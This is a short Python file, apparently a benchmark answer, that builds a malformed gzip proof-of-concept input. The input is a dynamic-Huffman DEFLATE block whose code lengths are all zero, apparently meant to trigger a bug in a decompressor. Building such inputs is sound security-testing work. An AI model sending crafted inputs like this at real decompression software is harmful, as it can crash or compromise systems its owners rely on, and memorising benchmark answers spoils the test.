import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitWriter:
            def __init__(self):
                self.data = bytearray()
                self.buffer = 0
                self.bit_count = 0

            def write(self, value: int, num_bits: int):
                value &= (1 << num_bits) - 1
                self.buffer |= (value << self.bit_count)
                self.bit_count += num_bits
                while self.bit_count >= 8:
                    self.data.append(self.buffer & 0xFF)
                    self.buffer >>= 8
                    self.bit_count -= 8
            
            def get_bytes(self):
                if self.bit_count > 0:
                    self.data.append(self.buffer & 0xFF)
                return bytes(self.data)

        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        bw = BitWriter()

        # BFINAL=1, BTYPE=10 (dynamic)
        bw.write(1, 1)
        bw.write(2, 2)

        # HLIT = 0 (257 codes)
        bw.write(0, 5)

        # HDIST = 0 (1 code)
        bw.write(0, 5)

        # HCLEN = 14 (18 code lengths)
        # Total bits = 17 (header) + 18 * 3 (lengths) = 71 bits => 9 bytes
        hclen_val = 14
        bw.write(hclen_val, 4)

        num_code_lengths = hclen_val + 4
        for _ in range(num_code_lengths):
            bw.write(0, 3)
        
        deflate_data = bw.get_bytes()

        uncompressed_data = b''
        crc = zlib.crc32(uncompressed_data)
        isize = len(uncompressed_data)
        trailer = crc.to_bytes(4, 'little') + isize.to_bytes(4, 'little')

        poc = header + deflate_data + trailer
        
        return poc